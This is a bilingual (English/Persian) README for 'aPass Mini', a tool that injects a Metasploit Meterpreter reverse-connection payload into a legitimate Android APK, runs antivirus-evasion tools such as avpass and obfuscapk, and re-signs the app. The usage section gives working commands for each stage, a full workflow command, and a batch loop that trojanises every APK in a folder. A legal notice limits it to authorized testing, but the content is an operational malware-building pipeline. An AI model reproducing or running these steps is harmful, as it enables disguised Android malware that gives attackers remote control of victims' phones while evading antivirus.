# aPass Mini v1.1.0

**English** | [فارسی](#راهنمای-فارسی)

An APK penetration testing and protection package by Aiden Azad (V7lthronyx) - Parvus Security Subcategory.

---

## 🚀 Features

- **Enhanced Security**: Secure input handling and validation
- **Better Error Handling**: Comprehensive validation and error reporting  
- **Configuration Management**: JSON-based configuration with interactive setup
- **Improved Logging**: Multi-level logging with both file and console output
- **Type Safety**: Full type hints for better code reliability
- **Progress Tracking**: Enhanced progress bars with realistic timing
- **Command Injection Protection**: Safe command construction using shlex
- **Results Reporting**: Beautiful tables showing operation results

## 📋 Prerequisites

### System Requirements
- **Operating System**: Linux (Ubuntu/Debian recommended), macOS, Windows (WSL)
- **Python**: 3.7 or higher
- **RAM**: Minimum 4GB, Recommended 8GB+
- **Storage**: At least 2GB free space
- **Network**: Internet connection for downloading dependencies

### Required Tools
- **Java Development Kit (JDK)**: Version 8 or higher
- **Metasploit Framework**: For payload generation
- **Docker**: For obfuscapk tool (optional but recommended)
- **Android SDK Build Tools**: For apksigner and zipalign

## 🛠️ Installation

### Step 1: System Dependencies

#### Ubuntu/Debian:
```bash
# Update package list
sudo apt update

# Install Java JDK
sudo apt install -y default-jdk

# Install Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
sudo ./msfinstall

# Install Android SDK tools
sudo apt install -y android-sdk-build-tools

# Install Docker (for obfuscapk)
sudo apt install -y docker.io
sudo systemctl start docker
sudo usermod -aG docker $USER
```

#### macOS:
```bash
# Install Homebrew if not installed
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install Java
brew install openjdk

# Install Metasploit
brew install metasploit

# Install Docker
brew install --cask docker
```

### Step 2: Python Environment
```bash
# Clone the repository
git clone https://github.com/v74all/apass_mini
cd apass_mini

# Create virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install Python dependencies
pip install -r requirements.txt
```

### Step 3: Verify Installation
```bash
# Test the installation
python apass_mini.py --version

# Check tool availability
java -version
msfvenom --version
docker --version
```

## 🎯 Usage Guide

### Initial Setup

#### 1. Configure Keystore Settings
```bash
python apass_mini.py config
```
This will prompt you to set:
- Keystore path
- Key alias
- Keystore password (optional, can be set later)
- Key password (optional, can be set later)

#### 2. Test Configuration
```bash
# Generate a test keystore
python apass_mini.py config
```

### Basic Commands

#### Create Meterpreter Payload
```bash
# Basic payload creation
python apass_mini.py payload -l 192.168.1.100 -p 4444 -s original.apk -o payload.apk

# With custom output name
python apass_mini.py payload -l 10.0.0.5 -p 8080 -s /path/to/app.apk -o custom_payload.apk
```

**Parameters:**
- `-l, --lhost`: Your listener IP address
- `-p, --lport`: Port number for reverse connection
- `-s, --src`: Source APK file path
- `-o, --out`: Output payload APK name

#### Apply Bypass Tools
```bash
# Use single tool
python apass_mini.py bypass -i payload.apk -t obfuscapk

# Use multiple tools
python apass_mini.py bypass -i payload.apk -t obfuscapk apkwash avpass

# All available tools
python apass_mini.py bypass -i payload.apk -t obfuscapk apkwash avpass nxcrypt
```

**Available Tools:**
- `obfuscapk`: Docker-based APK obfuscation (most effective)
- `apkwash`: APK washing utility
- `avpass`: Anti-virus bypass tool
- `nxcrypt`: NXcrypt encryption tool

#### Sign APK
```bash
# Using apksigner (recommended)
python apass_mini.py sign -i payload.apk -m apksigner

# Using jarsigner (legacy)
python apass_mini.py sign -i payload.apk -m jarsigner
```

#### Full Workflow
```bash
# Complete process: payload + bypass + sign
python apass_mini.py full -l 192.168.1.100 -p 4444 -s original.apk -o final.apk -t obfuscapk apkwash -m apksigner

# With debug logging
python apass_mini.py --log-level DEBUG full -l 192.168.1.100 -p 4444 -s original.apk -o final.apk
```

### Advanced Usage

#### Custom Logging
```bash
# Different log levels
python apass_mini.py --log-level DEBUG payload -l 192.168.1.100 -p 4444 -s app.apk
python apass_mini.py --log-level WARNING bypass -i payload.apk -t obfuscapk
```

#### Batch Processing
```bash
#!/bin/bash
# Process multiple APKs
for apk in *.apk; do
    python apass_mini.py full -l 192.168.1.100 -p 4444 -s "$apk" -o "processed_$apk"
done
```

## 🔧 Configuration File

The tool creates a `config.json` file for persistent settings:

```json
{
  "keystore_path": "my-release-key.keystore",
  "keystore_password": "",
  "key_alias": "my-key-alias",
  "key_password": "",
  "temp_dir": ""
}
```

### Manual Configuration
```bash
# Edit configuration manually
nano config.json

# Reset configuration
rm config.json
python apass_mini.py config
```

## 🐛 Troubleshooting

### Common Issues

#### Java Not Found
```bash
# Check Java installation
java -version
javac -version

# Install if missing
sudo apt install -y default-jdk
```

#### Metasploit Issues
```bash
# Update Metasploit
sudo msfupdate

# Check msfvenom
msfvenom --list payloads | grep android
```

#### Docker Permission Issues
```bash
# Add user to docker group
sudo usermod -aG docker $USER
# Logout and login again

# Test docker
docker run hello-world
```

#### APK Signing Failures
```bash
# Check keystore
keytool -list -keystore my-release-key.keystore

# Regenerate keystore
rm my-release-key.keystore
python apass_mini.py config
```

### Error Messages and Solutions

| Error | Solution |
|-------|----------|
| `Tool X not found` | Install the missing tool using system package manager |
| `Invalid IP address` | Check IP format (e.g., 192.168.1.100) |
| `Invalid port` | Use port range 1-65535 |
| `APK not found` | Check file path and permissions |
| `Keystore error` | Delete keystore and reconfigure |

## 📊 Logging and Monitoring

### Log Files
- **Location**: `apass_mini.log`
- **Rotation**: 5MB max size, 3 backup files
- **Format**: `timestamp | level | module | message`

### Log Levels
- **DEBUG**: Detailed debugging information
- **INFO**: General information (default)
- **WARNING**: Warning messages
- **ERROR**: Error messages only

### Monitoring Progress
```bash
# Watch log file in real-time
tail -f apass_mini.log

# Filter specific operations
grep "payload" apass_mini.log
grep "ERROR" apass_mini.log
```

## 🔐 Security Considerations

### Best Practices
1. **Use Strong Passwords**: Always use complex keystore passwords
2. **Secure Storage**: Keep keystore files in secure locations
3. **Network Security**: Use VPN when testing on remote networks
4. **Clean Up**: Remove temporary files after operations
5. **Logging**: Monitor logs for suspicious activities

### Security Features
- **Input Validation**: All inputs are validated before processing
- **Command Injection Protection**: Safe command construction
- **Secure Defaults**: Secure keystore generation parameters
- **Password Handling**: No passwords stored in plaintext

## ⚠️ Legal Notice

**IMPORTANT**: This tool is designed for:
- **Educational purposes**
- **Authorized penetration testing**
- **Security research**
- **Your own applications**

### Prohibited Uses
- Testing applications without explicit permission
- Malicious activities
- Unauthorized access to systems
- Distribution of malicious payloads

**Users are solely responsible for complying with all applicable laws and regulations.**

## 👨‍💻 Author Information

**Aiden Azad (V7lthronyx)**
- **Instagram**: [@V7lthronyx.core](https://instagram.com/V7lthronyx.core)
- **GitHub**: [v74all](https://github.com/v74all)
- **Organization**: Parvus Security Subcategory
- **Repository**: [apass_mini](https://github.com/v74all/apass_mini)

## 🤝 Contributing

### How to Contribute
1. **Fork** the repository
2. **Create** a feature branch: `git checkout -b feature-name`
3. **Commit** changes: `git commit -am 'Add feature'`
4. **Push** to branch: `git push origin feature-name`
5. **Create** a Pull Request

### Contribution Guidelines
- Follow Python PEP 8 style guide
- Add type hints for new functions
- Include comprehensive error handling
- Update documentation for new features
- Add tests for new functionality

## 📄 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

---

# راهنمای فارسی

بسته تست نفوذ و حفاظت APK توسط آیدن آزاد (V7lthronyx) - زیرمجموعه امنیت پاروس

## 🚀 ویژگی‌ها

- **امنیت پیشرفته**: مدیریت ایمن ورودی‌ها و اعتبارسنجی
- **مدیریت خطای بهتر**: اعتبارسنجی جامع و گزارش خطا
- **مدیریت پیکربندی**: پیکربندی مبتنی بر JSON با تنظیمات تعاملی
- **لاگ‌گیری بهبود یافته**: لاگ‌گیری چندسطحی با خروجی فایل و کنسول
- **ایمنی نوع**: نوع‌های کامل برای قابلیت اطمینان بهتر کد
- **ردیابی پیشرفت**: نوارهای پیشرفت بهبود یافته با زمان‌بندی واقعی
- **حفاظت از تزریق دستور**: ساخت ایمن دستورات با استفاده از shlex
- **گزارش نتایج**: جداول زیبا برای نمایش نتایج عملیات

## 📋 پیش‌نیازها

### نیازمندی‌های سیستم
- **سیستم‌عامل**: لینوکس (اوبونتو/دبیان توصیه می‌شود)، macOS، ویندوز (WSL)
- **پایتون**: نسخه 3.7 یا بالاتر
- **رم**: حداقل 4 گیگابایت، توصیه می‌شود 8+ گیگابایت
- **فضای ذخیره**: حداقل 2 گیگابایت فضای خالی
- **شبکه**: اتصال اینترنت برای دانلود وابستگی‌ها

### ابزارهای مورد نیاز
- **Java Development Kit (JDK)**: نسخه 8 یا بالاتر
- **Metasploit Framework**: برای تولید payload
- **Docker**: برای ابزار obfuscapk (اختیاری اما توصیه می‌شود)
- **Android SDK Build Tools**: برای apksigner و zipalign

## 🛠️ نصب

### مرحله 1: وابستگی‌های سیستم

#### اوبونتو/دبیان:
```bash
# به‌روزرسانی لیست بسته‌ها
sudo apt update

# نصب Java JDK
sudo apt install -y default-jdk

# نصب Metasploit Framework
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
sudo ./msfinstall

# نصب ابزارهای Android SDK
sudo apt install -y android-sdk-build-tools

# نصب Docker (برای obfuscapk)
sudo apt install -y docker.io
sudo systemctl start docker
sudo usermod -aG docker $USER
```

#### macOS:
```bash
# نصب Homebrew در صورت عدم وجود
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# نصب Java
brew install openjdk

# نصب Metasploit
brew install metasploit

# نصب Docker
brew install --cask docker
```

### مرحله 2: محیط پایتون
```bash
# کلون کردن مخزن
git clone https://github.com/v74all/apass_mini
cd apass_mini

# ایجاد محیط مجازی (توصیه می‌شود)
python3 -m venv venv
source venv/bin/activate  # در ویندوز: venv\Scripts\activate

# نصب وابستگی‌های پایتون
pip install -r requirements.txt
```

### مرحله 3: تأیید نصب
```bash
# تست نصب
python apass_mini.py --version

# بررسی دسترسی ابزارها
java -version
msfvenom --version
docker --version
```

## 🎯 راهنمای استفاده

### تنظیمات اولیه

#### 1. پیکربندی تنظیمات Keystore
```bash
python apass_mini.py config
```
این دستور از شما می‌خواهد تا تنظیم کنید:
- مسیر keystore
- نام مستعار key
- رمز عبور keystore (اختیاری، می‌توان بعداً تنظیم کرد)
- رمز عبور key (اختیاری، می‌توان بعداً تنظیم کرد)

#### 2. تست پیکربندی
```bash
# تولید یک keystore آزمایشی
python apass_mini.py config
```

### دستورات پایه

#### ایجاد Payload مترپرتر
```bash
# ایجاد payload پایه
python apass_mini.py payload -l 192.168.1.100 -p 4444 -s original.apk -o payload.apk

# با نام خروجی سفارشی
python apass_mini.py payload -l 10.0.0.5 -p 8080 -s /path/to/app.apk -o custom_payload.apk
```

**پارامترها:**
- `-l, --lhost`: آدرس IP شنونده شما
- `-p, --lport`: شماره پورت برای اتصال معکوس
- `-s, --src`: مسیر فایل APK منبع
- `-o, --out`: نام APK خروجی payload

#### اعمال ابزارهای Bypass
```bash
# استفاده از تک ابزار
python apass_mini.py bypass -i payload.apk -t obfuscapk

# استفاده از چند ابزار
python apass_mini.py bypass -i payload.apk -t obfuscapk apkwash avpass

# تمام ابزارهای موجود
python apass_mini.py bypass -i payload.apk -t obfuscapk apkwash avpass nxcrypt
```

**ابزارهای موجود:**
- `obfuscapk`: مبهم‌سازی APK مبتنی بر Docker (مؤثرترین)
- `apkwash`: ابزار شستشوی APK
- `avpass`: ابزار دور زدن آنتی‌ویروس
- `nxcrypt`: ابزار رمزنگاری NXcrypt

#### امضای APK
```bash
# استفاده از apksigner (توصیه می‌شود)
python apass_mini.py sign -i payload.apk -m apksigner

# استفاده از jarsigner (قدیمی)
python apass_mini.py sign -i payload.apk -m jarsigner
```

#### گردش کار کامل
```bash
# فرآیند کامل: payload + bypass + امضا
python apass_mini.py full -l 192.168.1.100 -p 4444 -s original.apk -o final.apk -t obfuscapk apkwash -m apksigner

# با لاگ‌گیری debug
python apass_mini.py --log-level DEBUG full -l 192.168.1.100 -p 4444 -s original.apk -o final.apk
```

### استفاده پیشرفته

#### لاگ‌گیری سفارشی
```bash
# سطوح مختلف لاگ
python apass_mini.py --log-level DEBUG payload -l 192.168.1.100 -p 4444 -s app.apk
python apass_mini.py --log-level WARNING bypass -i payload.apk -t obfuscapk
```

#### پردازش دسته‌ای
```bash
#!/bin/bash
# پردازش چند APK
for apk in *.apk; do
    python apass_mini.py full -l 192.168.1.100 -p 4444 -s "$apk" -o "processed_$apk"
done
```

## 🔧 فایل پیکربندی

ابزار یک فایل `config.json` برای تنظیمات دائمی ایجاد می‌کند:

```json
{
  "keystore_path": "my-release-key.keystore",
  "keystore_password": "",
  "key_alias": "my-key-alias",
  "key_password": "",
  "temp_dir": ""
}
```

### پیکربندی دستی
```bash
# ویرایش پیکربندی به صورت دستی
nano config.json

# بازنشانی پیکربندی
rm config.json
python apass_mini.py config
```

## 🐛 عیب‌یابی

### مشکلات رایج

#### Java یافت نشد
```bash
# بررسی نصب Java
java -version
javac -version

# نصب در صورت عدم وجود
sudo apt install -y default-jdk
```

#### مشکلات Metasploit
```bash
# به‌روزرسانی Metasploit
sudo msfupdate

# بررسی msfvenom
msfvenom --list payloads | grep android
```

#### مشکلات مجوز Docker
```bash
# افزودن کاربر به گروه docker
sudo usermod -aG docker $USER
# خروج و ورود مجدد

# تست docker
docker run hello-world
```

#### مشکلات امضای APK
```bash
# بررسی keystore
keytool -list -keystore my-release-key.keystore

# تولید مجدد keystore
rm my-release-key.keystore
python apass_mini.py config
```

### پیام‌های خطا و راه‌حل‌ها

| خطا | راه‌حل |
|-------|----------|
| `Tool X not found` | Install the missing tool using system package manager |
| `Invalid IP address` | Check IP format (e.g., 192.168.1.100) |
| `Invalid port` | Use port range 1-65535 |
| `APK not found` | Check file path and permissions |
| `Keystore error` | Delete keystore and reconfigure |

## 📊 لاگ‌گیری و نظارت

### فایل‌های لاگ
- **مکان**: `apass_mini.log`
- **چرخش**: حداکثر اندازه 5 مگابایت، 3 فایل پشتیبان
- **فرمت**: `زمان | سطح | ماژول | پیام`

### سطوح لاگ
- **DEBUG**: اطلاعات مفصل دیباگ
- **INFO**: اطلاعات عمومی (پیش‌فرض)
- **WARNING**: پیام‌های هشدار
- **ERROR**: فقط پیام‌های خطا

### نظارت بر پیشرفت
```bash
# تماشای فایل لاگ در زمان واقعی
tail -f apass_mini.log

# فیلتر کردن عملیات خاص
grep "payload" apass_mini.log
grep "ERROR" apass_mini.log
```

## 🔐 ملاحظات امنیتی

### بهترین شیوه‌ها
1. **استفاده از رمزهای قوی**: همیشه از رمزهای پیچیده keystore استفاده کنید
2. **ذخیره‌سازی ایمن**: فایل‌های keystore را در مکان‌های امن نگه دارید
3. **امنیت شبکه**: هنگام تست در شبکه‌های راه دور از VPN استفاده کنید
4. **پاک‌سازی**: فایل‌های موقت را پس از عملیات حذف کنید
5. **لاگ‌گیری**: لاگ‌ها را برای فعالیت‌های مشکوک نظارت کنید

### ویژگی‌های امنیتی
- **اعتبارسنجی ورودی**: تمام ورودی‌ها قبل از پردازش اعتبارسنجی می‌شوند
- **حفاظت از تزریق دستور**: ساخت ایمن دستورات
- **تنظیمات ایمن پیش‌فرض**: پارامترهای تولید keystore ایمن
- **مدیریت رمز عبور**: هیچ رمزی به صورت متن ساده ذخیره نمی‌شود

## ⚠️ اطلاعیه حقوقی

**مهم**: این ابزار طراحی شده است برای:
- **اهداف آموزشی**
- **تست نفوذ مجاز**
- **تحقیقات امنیتی**
- **برنامه‌های شخصی شما**

### استفاده‌های ممنوع
- تست برنامه‌ها بدون مجوز صریح
- فعالیت‌های مخرب
- دسترسی غیرمجاز به سیستم‌ها
- توزیع payloadهای مخرب

**کاربران مسئول رعایت تمام قوانین و مقررات قابل اجرا هستند.**

## 👨‍💻 اطلاعات نویسنده

**آیدن آزاد (V7lthronyx)**
- **اینستاگرام**: [@V7lthronyx.core](https://instagram.com/V7lthronyx.core)
- **گیت‌هاب**: [v74all](https://github.com/v74all)
- **سازمان**: زیرمجموعه امنیت پاروس
- **مخزن**: [apass_mini](https://github.com/v74all/apass_mini)

## 🤝 مشارکت

### نحوه مشارکت
1. **Fork** کردن مخزن
2. **ایجاد** شاخه ویژگی: `git checkout -b feature-name`
3. **Commit** تغییرات: `git commit -am 'Add feature'`
4. **Push** به شاخه: `git push origin feature-name`
5. **ایجاد** Pull Request

### راهنمای مشارکت
- از راهنمای سبک PEP 8 پایتون پیروی کنید
- نوع‌های جدید را برای توابع جدید اضافه کنید
- مدیریت خطای جامع را شامل شوید
- مستندات را برای ویژگی‌های جدید به‌روزرسانی کنید
- تست‌هایی برای عملکرد جدید اضافه کنید

## 📄 مجوز

این پروژه تحت مجوز **MIT** منتشر شده است.
